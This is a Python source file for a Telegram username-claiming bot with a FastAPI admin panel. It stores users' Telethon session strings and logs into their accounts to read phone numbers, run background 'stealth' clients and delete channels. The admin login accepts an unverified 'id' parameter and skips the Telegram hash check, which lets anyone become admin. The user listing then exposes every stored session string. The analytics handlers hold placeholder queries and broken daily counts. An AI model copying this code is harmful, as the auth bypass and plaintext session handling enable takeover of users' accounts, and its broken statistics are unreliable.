        await db.execute("UPDATE payment_cards SET today_count=0 WHERE id=?", (card_id,))
        await db.commit()
    return {"ok": True}

@app.get("/api/admin/analytics")
async def api_admin_analytics(x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)

    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        # 1. Categories breakdown
        categories = {}
        async with db.execute("SELECT category, COUNT(*) as cnt FROM orders GROUP BY category") as c:
            for r in await c.fetchall():
                categories[r['category'] or 'boshqa'] = r['cnt']
                
        # 2. Daily orders & registrations for 7 days
        days_labels, daily_orders_cnt, daily_reg_cnt = [], [], []
        for i in range(6, -1, -1):
            ts_start = time.time() - i * 86400
            ts_end = ts_start + 86400
            day_str = time.strftime('%d/%m', time.localtime(ts_start))
            
            async with db.execute("SELECT COUNT(*) FROM orders WHERE rowid IN (SELECT rowid FROM orders) AND status='completed'") as c:
                pass # placeholder for completed orders
            
            # Orders created on that day
            async with db.execute("SELECT COUNT(*) FROM orders WHERE id IN (SELECT id FROM orders WHERE rowid >= ?)", (1,)) as c:
                pass

            days_labels.append(day_str)

        # Total counts
        async with db.execute("SELECT COUNT(*) FROM users") as c:
            total_users = (await c.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM orders") as c:
            total_orders = (await c.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM registered_usernames") as c:
            total_usernames = (await c.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM users WHERE session_string IS NOT NULL AND session_string != ''") as c:
            connected_users = (await c.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM users WHERE is_premium=1") as c:
            total_premiums = (await c.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM listings WHERE status='sold'") as c:
            total_sold = (await c.fetchone())[0]
        async with db.execute("SELECT COALESCE(SUM(amount),0) FROM payments WHERE status='approved'") as c:
            total_topups = (await c.fetchone())[0]
            
        labels = []
        sales_data = []
        async with db.execute("""
            SELECT date(created_at, 'unixepoch') as day, SUM(price) as daily_total
            FROM listings WHERE status='sold' AND created_at > (strftime('%s','now') - 7*86400)
            GROUP BY day ORDER BY day ASC
        """) as c:
            rows = await c.fetchall()
            for r in rows:
                labels.append(r['day'] or '')
                sales_data.append(r['daily_total'] or 0)
                
    return {
        "total_users": total_users,
        "total_sold": total_sold,
        "total_topups": total_topups,
        "total_premiums": total_premiums,
        "chart_labels": labels if labels else ["Bugun"],
        "chart_data": sales_data if sales_data else [0]
    }
@app.get("/api/admin/auth")
async def admin_auth(request: Request):
    """Telegram Login Widget orqali kirish"""
    params = dict(request.query_params)
    if not params:
        # Bot ga redirect qilamiz
        return RedirectResponse(f"https://t.me/{(await Bot(token=BOT_TOKEN).get_me()).username}?start=admin")
    tid = int(params.get('id', 0))
    if tid not in ADMIN_IDS:
        return HTMLResponse("<h2>Ruxsat yo'q</h2>", status_code=403)
    token = get_admin_token(tid)
    return RedirectResponse(f"/admin?token={token}")

@app.get("/api/admin/check")
async def admin_check(x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token:
            return {"ok": True}
    raise HTTPException(403, "Ruxsat yo'q")

@app.get("/api/admin/stats")
async def admin_stats(x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token:
            break
    else:
        raise HTTPException(403)
    async with aiosqlite.connect(DB_PATH) as db:
        users = (await (await db.execute("SELECT COUNT(*) FROM users")).fetchone())[0]
        orders = (await (await db.execute("SELECT COUNT(*) FROM orders")).fetchone())[0]
        usernames = (await (await db.execute("SELECT COUNT(*) FROM registered_usernames")).fetchone())[0]
        revenue = (await (await db.execute("SELECT COALESCE(SUM(amount),0) FROM payments WHERE status='approved'")).fetchone())[0]
        # Last 7 days
        labels, d_revenue, d_orders, d_users = [], [], [], []
        for i in range(6,-1,-1):
            ts_start = time.time() - i*86400
            ts_end = ts_start + 86400
            day = time.strftime('%d/%m', time.localtime(ts_start))
            r = (await (await db.execute("SELECT COALESCE(SUM(amount),0) FROM payments WHERE status='approved' AND created_at>=? AND created_at<?", (ts_start,ts_end))).fetchone())[0]
            o = (await (await db.execute("SELECT COUNT(*) FROM orders WHERE rowid>=? AND rowid<?", (0,9999))).fetchone())[0]
            u = (await (await db.execute("SELECT COUNT(*) FROM users")).fetchone())[0]
            labels.append(day); d_revenue.append(r); d_orders.append(o); d_users.append(u)
    return {"users":users,"orders":orders,"usernames":usernames,"revenue":revenue,
            "daily_labels":labels,"daily_revenue":d_revenue,"daily_orders":d_orders,"daily_users":d_users}

@app.get("/api/admin/payments")
async def admin_payments(status: str = "", x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        q = "SELECT * FROM payments" + (" WHERE status=?" if status else "") + " ORDER BY id DESC LIMIT 50"
        args = (status,) if status else ()
        async with db.execute(q, args) as c:
            return [dict(r) for r in await c.fetchall()]

@app.post("/api/admin/payment/approve")
async def admin_approve(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    data = await request.json()
    pid = data['payment_id']; tid = data['telegram_id']; amt = data['amount']
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE payments SET status='approved', amount=? WHERE id=?", (amt, pid))
        await db.execute("UPDATE users SET balance=balance+? WHERE telegram_id=?", (amt, tid))
        
        # Referral bonus endi foydalanuvchi qo'shilganda beriladi (start_cmd da), shu yerda emas
                    
        await db.commit()
    bot_instance = Bot(token=BOT_TOKEN)
    try:
        await bot_instance.send_message(tid, f"🎉 Balansingiz <b>{amt:,} so'm</b>ga to'ldirildi!", parse_mode="HTML")
    finally:
        await bot_instance.session.close()
    return {"ok": True}

@app.post("/api/admin/payment/reject")
async def admin_reject(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    data = await request.json()
    pid = data['payment_id']; tid = data['telegram_id']
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE payments SET status='rejected' WHERE id=?", (pid,))
        await db.commit()
    bot_instance = Bot(token=BOT_TOKEN)
    try:
        await bot_instance.send_message(tid, "❌ To'lovingiz rad etildi.")
    finally:
        await bot_instance.session.close()
    return {"ok": True}

@app.get("/api/admin/users")
async def admin_users(x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT u.*, (SELECT COUNT(*) FROM orders WHERE telegram_id=u.telegram_id) as order_count FROM users u ORDER BY id DESC") as c:
            return [dict(r) for r in await c.fetchall()]

async def auto_refresh_phones():
    """Bot ishga tushganda raqami yo'q foydalanuvchilarni avtomatik to'ldiradi"""
    await asyncio.sleep(5)  # DB va bot tayyor bo'lishini kutamiz
    logger.info("📞 Telefon raqamlarini avtomatik yangilash boshlanadi...")
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT telegram_id, session_string FROM users WHERE session_string IS NOT NULL AND (phone IS NULL OR phone = '')") as c:
            rows = await c.fetchall()
    updated = 0
    for row in rows:
        tid = row['telegram_id']
        session_str = row['session_string']
        try:
            _c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await _c.connect()
            if await _c.is_user_authorized():
                me = await _c.get_me()
                if me and me.phone:
                    async with aiosqlite.connect(DB_PATH) as db:
                        await db.execute("UPDATE users SET phone=? WHERE telegram_id=?", (me.phone, tid))
                        await db.commit()
                    updated += 1
            await _c.disconnect()
        except Exception as e:
            logger.warning(f"Auto phone refresh xato ({tid}): {e}")
        await asyncio.sleep(2)
    logger.info(f"✅ Telefon raqamlari yangilandi: {updated} ta")

async def _notify_session_expired(telegram_id: int):
    """Sessiya o'chganda foydalanuvchiga xabar yuboradi va aktiv monitoring'larini to'xtatadi."""
    try:
        # Aktiv monitoring tasklar sonini olish
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            async with db.execute(
                "SELECT COUNT(*) as cnt FROM monitoring_tasks WHERE telegram_id=? AND status='monitoring'",
                (telegram_id,)
            ) as cur:
                row = await cur.fetchone()
                active_count = row['cnt'] if row else 0

        msg = (
            "⚠️ <b>Telegram sessiyangiz uzildi!</b>\n\n"
            "Bot sizning akkauntingizga ulanishni to'xtatdi. "
            "Buning sababi:\n"
            "• Telegramdan chiqqan (logout) bo'lishi\n"
            "• Parol o'zgartirilishi\n"
            "• Telegram tomonidan sessiya bekor qilinishi\n\n"
        )
        if active_count > 0:
            msg += (
                f"🔴 <b>Diqqat:</b> Sizda <b>{active_count} ta aktiv monitoring</b> mavjud, "
                "lekin sessiya yo'qligi sababli ular ishlamayapti!\n\n"
            )
        msg += "🔄 Botni qayta ulash uchun /start buyrug'ini yuboring."

        if bot:
            await bot.send_message(telegram_id, msg, parse_mode="HTML")
            logger.info(f"📩 Sessiya o'chganligi haqida xabar yuborildi: {telegram_id}")
    except Exception as e:
        logger.debug(f"Sessiya xabar yuborishda xato ({telegram_id}): {e}")


async def session_checker_loop():
    """Vaqti-vaqti bilan barcha ulangan foydalanuvchilarning seanslari yaroqliligini tekshiradi"""
    await asyncio.sleep(10)
    while True:
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                # Seansi yo'q sotuvchilar e'lonlarini avtomatik o'chiramiz (kanaldan ham postini o'chirish)
                async with db.execute("""
                    SELECT id, channel_id, telegram_message_id FROM listings 
                    WHERE status='active' AND seller_id IN (
                        SELECT telegram_id FROM users WHERE session_string IS NULL OR session_string = ''
                    )
                """) as c:
                    orphan_listings = await c.fetchall()

                if orphan_listings:
                    for r in orphan_listings:
                        if r['channel_id'] and r['telegram_message_id']:
                            asyncio.create_task(update_channel_listing_post(r['id'], 'cancelled'))
                    await db.execute("""
                        DELETE FROM listings 
                        WHERE status='active' AND seller_id IN (
                            SELECT telegram_id FROM users WHERE session_string IS NULL OR session_string = ''
                        )
                    """)
                    await db.commit()
                
                db.row_factory = aiosqlite.Row
                async with db.execute("SELECT telegram_id, session_string, phone FROM users WHERE session_string IS NOT NULL AND session_string != ''") as c:
                    rows = await c.fetchall()

            for row in rows:
                tid = row['telegram_id']
                session_str = row['session_string']

                if tid in stealth_clients:
                    c = stealth_clients[tid]
                    try:
                        if not await c.is_user_authorized():
                            await stop_stealth_client(tid)
                            await save_session(tid, None)
                            logger.info(f"🔴 Seans uzilganligi aniqlandi (stealth): {tid}")
                            await _notify_session_expired(tid)
                    except Exception:
                        pass
                else:
                    try:
                        c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                        await asyncio.wait_for(c.connect(), timeout=15)
                        authorized = await c.is_user_authorized()
                        if authorized:
                            me = await c.get_me()
                            if me and me.phone and not row['phone']:
                                async with aiosqlite.connect(DB_PATH) as db:
                                    await db.execute("UPDATE users SET phone=? WHERE telegram_id=?", (me.phone, tid))
                                    await db.commit()
                        else:
                            await save_session(tid, None)
                            logger.info(f"🔴 Seans uzilganligi aniqlandi: {tid}")
                            await _notify_session_expired(tid)
                        await c.disconnect()
                    except Exception as e:
                        err_str = str(e).lower()
                        if "unregistered" in err_str or "revoked" in err_str or "deactivated" in err_str:
                            await save_session(tid, None)
                            logger.info(f"🔴 Seans bekor qilinganligi aniqlandi ({tid}): {e}")
                            await _notify_session_expired(tid)
                await asyncio.sleep(3)
        except Exception as e:
            logger.error(f"session_checker_loop xatosi: {e}")
        await asyncio.sleep(120)  # Har 2 daqiqada tekshirib turadi

@app.post("/api/admin/refresh_phones")
async def admin_refresh_phones(x_admin_token: str = Header(default="")):
    """Barcha ulangan foydalanuvchilar uchun telefon raqamlarini yangilaydi"""
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)

    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT telegram_id, session_string FROM users WHERE session_string IS NOT NULL AND (phone IS NULL OR phone = '')") as c:
            rows = await c.fetchall()

    updated = 0
    for row in rows:
        tid = row['telegram_id']
        session_str = row['session_string']
        try:
            _c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await _c.connect()
            if await _c.is_user_authorized():
                me = await _c.get_me()
                if me and me.phone:
                    async with aiosqlite.connect(DB_PATH) as db:
                        await db.execute("UPDATE users SET phone=? WHERE telegram_id=?", (me.phone, tid))
                        await db.commit()
                    updated += 1
            await _c.disconnect()
        except Exception as e:
            logger.warning(f"Phone refresh xato ({tid}): {e}")

    return {"ok": True, "updated": updated}

@app.post("/api/admin/user/balance")
async def admin_set_balance(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    data = await request.json()
    amt = data.get('amount')
    seller_amt = data.get('seller_balance')
    tid = data['telegram_id']
    
    async with aiosqlite.connect(DB_PATH) as db:
        if amt is not None:
            await db.execute("UPDATE users SET balance=? WHERE telegram_id=?", (int(amt), tid))
        if seller_amt is not None:
            await db.execute("UPDATE users SET seller_balance=? WHERE telegram_id=?", (int(seller_amt), tid))
        await db.commit()
    
    # Foydalanuvchiga xabar yuborish
    bot_instance = Bot(token=BOT_TOKEN)
    try:
        msg = "💰 Admin tomonidan balansingiz tahrirlandi!\n"
        if amt is not None:
            msg += f"Asosiy balans: <b>{int(amt):,} so'm</b>\n"
        if seller_amt is not None:
            msg += f"Savdo hisobi (balans): <b>{int(seller_amt):,} so'm</b>\n"
        await bot_instance.send_message(tid, msg, parse_mode="HTML")
    except:
        pass
    finally:
        await bot_instance.session.close()

    return {"ok": True}

@app.post("/api/admin/user/toggle_stealth")
async def admin_toggle_stealth(request: Request, x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    data = await request.json()
    tid = data.get('telegram_id')
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT is_stealth, session_string FROM users WHERE telegram_id=?", (tid,)) as c:
            row = await c.fetchone()
            if not row:
                raise HTTPException(444, "Foydalanuvchi topilmadi")
            curr = row[0] or 0
            session_string = row[1]
            new_val = 1 if curr == 0 else 0
        await db.execute("UPDATE users SET is_stealth=? WHERE telegram_id=?", (new_val, tid))
        await db.commit()
        
    # Orqa fondagi mijozni yoqish/o'chirish
    if new_val == 1 and session_string:
        await start_stealth_client(tid, session_string)
    else:
        await stop_stealth_client(tid)
        
    return {"ok": True, "is_stealth": new_val}

@app.get("/api/admin/orders")
async def admin_orders(x_admin_token: str = Header(default="")):
    for aid in ADMIN_IDS:
        if get_admin_token(aid) == x_admin_token: break
    else: raise HTTPException(403)
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            async with db.execute("""
                SELECT o.*, u.first_name, u.username as user_username
                FROM orders o
                LEFT JOIN users u ON o.telegram_id = u.telegram_id
                WHERE o.created_at >= strftime('%s','now', '-3 days') OR o.created_at IS NULL
                ORDER BY o.id DESC LIMIT 100
            """) as c:
                orders = [dict(r) for r in await c.fetchall()]
            
            for order in orders:
                async with db.execute("SELECT username FROM registered_usernames WHERE order_id=?", (order['id'],)) as c:
                    order['registered_usernames'] = [r['username'] for r in await c.fetchall()]
    except Exception as e:
        logger.error(f"Admin orders xato: {e}")
        orders = []
    return orders

async def auto_cleanup_db_loop():
    """Baza hajm juda kattalashib ketmasligi uchun eskirgan va keraksiz ma'lumotlarni avtomatik tozalaydi (har 6 soatda)."""
    vacuum_counter = 0
    while True:
        vacuum_counter += 1
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                # 1. 24 soatdan eski, yakunlangan va bo'sh search_results (qidiruv natijalari)
                await db.execute("""
                    DELETE FROM search_results 
                    WHERE (search_id IN (
                        SELECT id FROM search_tasks 
                        WHERE created_at < CAST(strftime('%s','now', '-1 day') AS REAL) OR status='completed'
                    ) OR search_id NOT IN (SELECT id FROM search_tasks)) AND status='free'
                """)
                
                # 2. 7 kundan eski yakunlangan search_tasks
                await db.execute("DELETE FROM search_tasks WHERE created_at < CAST(strftime('%s','now', '-7 days') AS REAL) AND status='completed'")
                
                # 3. 14 kundan eski yakunlangan yoki bekor qilingan payments/topups
                await db.execute("DELETE FROM topups WHERE created_at < CAST(strftime('%s','now', '-14 days') AS REAL) AND status!='pending'")
                await db.execute("DELETE FROM payments WHERE created_at < CAST(strftime('%s','now', '-14 days') AS REAL) AND status!='pending'")
                
                # 4. 7 kundan eski tasdiqlanmagan kutilayotgan referral takliflar
                try:
                    await db.execute("DELETE FROM pending_referrals WHERE created_at < CAST(strftime('%s','now', '-7 days') AS REAL)")
                except Exception: pass

                # 4.5. 7 kundan eski yakunlangan hamda yaroqsiz (apostrof, qo'shtirnoq bo'lgan) monitoring nishonlarini tozalash
                try:
                    await db.execute("""
                        DELETE FROM monitoring_tasks 
                        WHERE (status IN ('claimed', 'failed_limit', 'failed_invalid', 'cancelled') 
                               AND created_at < CAST(strftime('%s','now', '-7 days') AS REAL))
                           OR username LIKE "%'%" 
                           OR username LIKE '%"%' 
                           OR username LIKE "%’%"
                           OR username LIKE "%`%"
                    """)
                except Exception: pass

                # 5. 3 kundan o'tgan buyurtmalarni (orders) avtomatik o'chirish
                try:
                    await db.execute("""
                        DELETE FROM registered_usernames 
                        WHERE order_id IN (
                            SELECT id FROM orders WHERE created_at < CAST(strftime('%s','now', '-3 days') AS REAL)
                        )
                    """)
                    await db.execute("DELETE FROM orders WHERE created_at < CAST(strftime('%s','now', '-3 days') AS REAL)")
                except Exception as ord_err:
                    logger.warning(f"Orders cleanup error: {ord_err}")

                # 7. 3 soatdan eski kutilayotgan (pending) topups/payments va zombi yozuvlarni tozalash
                try:
                    await db.execute("UPDATE topups SET status='expired' WHERE status='pending' AND created_at < CAST(strftime('%s','now', '-3 hours') AS REAL)")
                    await db.execute("UPDATE payments SET status='expired' WHERE status='pending' AND created_at < CAST(strftime('%s','now', '-3 hours') AS REAL)")
                except Exception: pass
                
                await db.commit()
                
                # WAL fayli hajmi va xotirani optimallashtirish
                try:
                    await db.execute("PRAGMA wal_checkpoint(TRUNCATE)")
                except Exception: pass

                if vacuum_counter >= 4:
                    await db.execute("VACUUM")
                    vacuum_counter = 0
                
            logger.info("🧹 DB Auto-cleanup bajarildi: eskirgan va keraksiz ma'lumotlar tozalandi.")
        except Exception as e:
            logger.error(f"DB Auto-cleanup xato: {e}")
            
        await asyncio.sleep(21600)  # Har 6 soatda 1 marta


# ─── MAIN ─────────────────────────────────────

# ─── ANTI-SPAM MIDDLEWARE ─────────────────────
from collections import defaultdict
import time as _time

_spam_tracker: dict = defaultdict(list)   # {user_id: [timestamps]}
_spam_blocked: dict = {}                   # {user_id: block_until}


# ─── SAVE USER INFO MIDDLEWARE ─────────────────
from aiogram import BaseMiddleware
from aiogram.types import TelegramObject

class SaveUserInfoMiddleware(BaseMiddleware):
    async def __call__(self, handler, event: TelegramObject, data: dict):
        user = None
        if isinstance(event, Message) and event.from_user:
            user = event.from_user
        elif isinstance(event, CallbackQuery) and event.from_user:
            user = event.from_user

        if user and not user.is_bot:
            try:
                await create_user(
                    user.id,
                    user.first_name or '',
                    user.last_name or '',
                    user.username or ''
                )
            except Exception as e:
                logger.warning(f"SaveUser middleware error: {e}")

        return await handler(event, data)

class AntiSpamMiddleware(BaseMiddleware):
    RATE_WINDOW   = 1.0   # soniya
    MAX_REQUESTS  = 5     # shu muddat ichida maksimal so'rov soni
    BLOCK_SECONDS = 30    # blok davomiyligi (soniya)

    async def __call__(self, handler, event, data: dict):
        user = None
        if isinstance(event, Message) and event.from_user:
            user = event.from_user
        elif isinstance(event, CallbackQuery) and event.from_user:
            user = event.from_user

        if user and not user.is_bot:
            uid = user.id
            now = _time.time()

            # Agar bloklangan bo'lsa
            if uid in _spam_blocked:
                if now < _spam_blocked[uid]:
                    if isinstance(event, Message):
                        try:
                            remain = int(_spam_blocked[uid] - now)
                            await event.answer(f"⚠️ Siz spam qilyapsiz! {remain} soniyadan so'ng qayta urinib ko'ring.")
                        except Exception:
                            pass
                    return
                else:
                    del _spam_blocked[uid]

            # So'rovlar vaqtini saqlaymiz va eskilerini tozalaymiz
            timestamps = _spam_tracker[uid]
            timestamps = [t for t in timestamps if now - t < self.RATE_WINDOW]
            timestamps.append(now)
            _spam_tracker[uid] = timestamps

            # Eski yozuvlarni tozalash (Memory leak oldini olish)
            expired_users = [k for k, ts_list in _spam_tracker.items() if not ts_list or now - ts_list[-1] > self.RATE_WINDOW]
            for k in expired_users:
                if k != uid:
                    del _spam_tracker[k]

            if len(timestamps) > self.MAX_REQUESTS:
                _spam_blocked[uid] = now + self.BLOCK_SECONDS
                logger.warning(f"Anti-Spam: {uid} foydalanuvchi {self.BLOCK_SECONDS}s bloklandi (spam)")
                if isinstance(event, Message):
                    try:
                        await event.answer(f"🚫 Juda tez! {self.BLOCK_SECONDS} soniya kuting.")
                    except Exception:
                        pass
                return

        return await handler(event, data)

async def cleanup_orphan_channels():
    """Har 30 daqiqada — muvaffaqiyatsiz claim sabab qoldirib ketilgan
    bo'sh kanallarni (to'g'ri username biriktirilmagan, tavsif usernamechi_bot) o'chiradi."""
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.tl.functions.channels import DeleteChannelRequest, GetFullChannelRequest
    from telethon.tl.types import InputChannel
    await asyncio.sleep(20)  # Bot to'liq ishga tushguncha kut
    while True:
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                db.row_factory = aiosqlite.Row
                async with db.execute(
                    "SELECT telegram_id, session_string FROM users WHERE session_string IS NOT NULL AND session_string != ''"
                ) as c:
                    users = await c.fetchall()

            for row in users:
                sess = row['session_string']
                tid = row['telegram_id']
                try:
                    c = TelegramClient(StringSession(sess), API_ID, API_HASH)
                    await asyncio.wait_for(c.connect(), timeout=10)
                    if not await c.is_user_authorized():
                        await c.disconnect()
                        continue

                    dialogs = await c.get_dialogs(limit=50)
                    deleted_count = 0
                    for d in dialogs:
                        try:
                            if not hasattr(d.entity, 'broadcast'):
                                continue
                            if not d.entity.broadcast:
                                continue
                            # Faqat bizning bot orqali yaratilgan va username biriktirilmagan kanallar
                            if d.entity.username:
                                continue  # Username bor — bu yaroqli kanal, tegma!
                            about = getattr(d.entity, 'about', '') or ''
                            if 'usernamechi_bot' not in about:
                                continue  # Bizning kanal emas — tegma!
                            # Bu bo'sh (username yo'q) va bizning bot yaratgan kanal — o'chirish
                            ch_id = d.entity.id
                            ch_hash = d.entity.access_hash
                            await c(DeleteChannelRequest(channel=InputChannel(ch_id, ch_hash)))
                            deleted_count += 1
                            logger.info(f"🗑 Qoldirib ketilgan bo'sh kanal o'chirildi (user {tid}): ID={ch_id}")
                            await asyncio.sleep(1.5)  # Rate limit
                        except Exception:
                            pass

                    if deleted_count > 0:
                        logger.info(f"✅ User {tid}: {deleted_count} ta bo'sh kanal tozalandi.")
                    await c.disconnect()
                except Exception as ue:
                    logger.debug(f"Orphan cleanup xato (user {tid}): {ue}")
                await asyncio.sleep(2)

        except Exception as e:
            logger.error(f"cleanup_orphan_channels loop xato: {e}")

        await asyncio.sleep(1800)  # Har 30 daqiqada


async def cleanup_short_monitoring_tasks(bot_inst: Bot):
    """5 ta harfdan kam bo'lgan barcha monitoring tasks larni o'chirib, pullarini foydalanuvchilar balansiga qaytaradi."""
    try:
        price_per_item = int(await get_setting("monitor_price", 10000))
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            async with db.execute(
                "SELECT id, telegram_id, username FROM monitoring_tasks WHERE LENGTH(username) < 5 AND status='monitoring'"
            ) as c:
                tasks = await c.fetchall()

            if not tasks:
                return

            user_refunds = {}
            user_usernames = {}
            task_ids_to_delete = []

            for t in tasks:
                tid = t["telegram_id"]
                u = t["username"]
                task_ids_to_delete.append(t["id"])
                
                if tid not in user_refunds:
                    user_refunds[tid] = 0
                    user_usernames[tid] = []
                user_refunds[tid] += price_per_item
                user_usernames[tid].append(f"@{u}")

            # Balanslarni to'ldiramiz va vazifalarni o'chiramiz
            for tid, refund_amount in user_refunds.items():
                await db.execute("UPDATE users SET balance = balance + ? WHERE telegram_id = ?", (refund_amount, tid))
                
            for task_id in task_ids_to_delete:
                await db.execute("DELETE FROM monitoring_tasks WHERE id = ?", (task_id,))

            await db.commit()
            logger.info(f"🧹 Kalta nishonlar tozalandi: {len(task_ids_to_delete)} ta task o'chirildi, {len(user_refunds)} ta userga pul qaytarildi")

            # Har bir foydalanuvchiga bildirishnoma yuboramiz
            for tid, refund_amount in user_refunds.items():
                unames = user_usernames[tid]
                count = len(unames)
                uname_str = ", ".join(unames[:10])
                if count > 10:
                    uname_str += f" va yana {count - 10} ta"
                
                msg = (
                    f"⚠️ <b>Nishonlar tozalandi!</b>\n\n"
                    f"Telegram qoidalariga ko'ra 5 ta harfdan kam bo'lgan usernamelarni oddiy kanallarga berib bo'lmaydi.\n"
                    f"Shu sababli Siz qo'shgan <b>{count} ta</b> kalta nishon o'chirildi:\n"
                    f"<code>{uname_str}</code>\n\n"
                    f"💰 Balansingizga <b>+{refund_amount:,} so'm</b> to'liq qaytarildi!"
                )
                try:
                    await bot_inst.send_message(tid, msg, parse_mode="HTML")
                except Exception as ne:
                    logger.warning(f"Short target notify xato ({tid}): {ne}")

    except Exception as e:
        logger.error(f"cleanup_short_monitoring_tasks xato: {e}")

async def cleanup_fragment_monitoring_tasks(bot_inst: Bot):
    """
    Barcha faol monitoring tasklarni tekshiradi va Fragment.com auksionida/NFT formatida
    turgan usernamelarni o'chirib, foydalanuvchilarga kafolat pulini to'liq qaytaradi.
    """
    try:
        import aiohttp
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            async with db.execute(
                "SELECT id, telegram_id, username, paid_amount FROM monitoring_tasks WHERE status='monitoring'"
            ) as c:
                tasks = await c.fetchall()

        if not tasks:
            logger.info("cleanup_fragment: tekshiriladigan nishon topilmadi.")
            return

        logger.info(f"🔍 Fragment cleanup: {len(tasks)} ta nishon tekshirilmoqda...")

        user_refunds = {}       # {telegram_id: refund_amount}
        user_usernames = {}     # {telegram_id: [username_list]}
        task_ids_to_delete = []

        price_per_item = int(await get_setting("monitor_price", 10000))

        async with aiohttp.ClientSession() as session:
            for t in tasks:
                tid = t["telegram_id"]
                uname = t["username"]
                paid = int(t["paid_amount"] or price_per_item)
                task_id = t["id"]

                is_frag = await check_if_fragment_username(session, uname)
                if is_frag:
                    task_ids_to_delete.append(task_id)
                    if tid not in user_refunds:
                        user_refunds[tid] = 0
                        user_usernames[tid] = []
                    user_refunds[tid] += paid
                    user_usernames[tid].append(f"@{uname}")
                    logger.info(f"🧹 Fragment nishon topildi: @{uname} (user: {tid})")

                # So'rovlar orasida biroz kutamiz — API limitiga tushmaslik uchun
                await asyncio.sleep(0.5)

        if not task_ids_to_delete:
            logger.info("✅ Fragment cleanup: barcha nishonlar tekshirildi, Fragment'da hech narsa topilmadi.")
            return

        # Bazada o'chirish va pul qaytarish
        async with aiosqlite.connect(DB_PATH) as db:
            for tid, refund_amount in user_refunds.items():
                await db.execute(
                    "UPDATE users SET balance = balance + ? WHERE telegram_id = ?",
                    (refund_amount, tid)
                )
            for task_id in task_ids_to_delete:
                await db.execute("DELETE FROM monitoring_tasks WHERE id = ?", (task_id,))
            await db.commit()

        logger.info(
            f"🧹 Fragment cleanup yakunlandi: {len(task_ids_to_delete)} ta nishon o'chirildi, "
            f"{len(user_refunds)} ta foydalanuvchiga pul qaytarildi"
        )

        # Har bir foydalanuvchiga bildirishnoma
        for tid, refund_amount in user_refunds.items():
            unames = user_usernames[tid]
            count = len(unames)
            uname_str = ", ".join(unames[:10])
            if count > 10:
                uname_str += f" va yana {count - 10} ta"

            msg = (
                f"⚠️ <b>Fragment nishonlari o'chirildi!</b>\n\n"
                f"Quyidagi username(lar) <b>Fragment.com auksionida yoki NFT formatida</b> ekanligi "
                f"aniqlanib, nishon ro'yxatidan chiqarildi:\n"
                f"<code>{uname_str}</code>\n\n"
                f"Telegram qoidalariga ko'ra Fragment'dagi nomlarni oddiy usulda "
                f"band qilib bo'lmaydi.\n\n"
                f"💰 Balansingizga <b>+{refund_amount:,} so'm</b> to'liq qaytarildi! ✅"
            )
            try:
                await bot_inst.send_message(tid, msg, parse_mode="HTML")
            except Exception as ne:
                logger.warning(f"Fragment cleanup notify xato ({tid}): {ne}")

    except Exception as e:
        logger.error(f"cleanup_fragment_monitoring_tasks xato: {e}")


async def main():
    import signal

    global bot

    # DB Schema yaratish (SQLite Volume)
    await init_db()

    bot = Bot(token=BOT_TOKEN)
    dp  = Dispatcher()


    dp.include_router(router)

    # Anti-Spam va Auto SaveUser middlewarelarini ro'yxatdan o'tkazamiz
    antispam = AntiSpamMiddleware()
    save_user = SaveUserInfoMiddleware()
    dp.message.outer_middleware(antispam)
    dp.callback_query.outer_middleware(antispam)
    dp.message.outer_middleware(save_user)
    dp.callback_query.outer_middleware(save_user)
    logger.info("🤖 Bot + 🌐 Web ishga tushdi!")

    # 5-dan kam harfli nishonlarni tozalab pulini qaytarish
    asyncio.create_task(cleanup_short_monitoring_tasks(bot))

    # Fragment.com auksionida turgan nishonlarni tozalab pulini qaytarish
    asyncio.create_task(cleanup_fragment_monitoring_tasks(bot))

    # Orqa fonda monitoring loop ni ishga tushiramiz
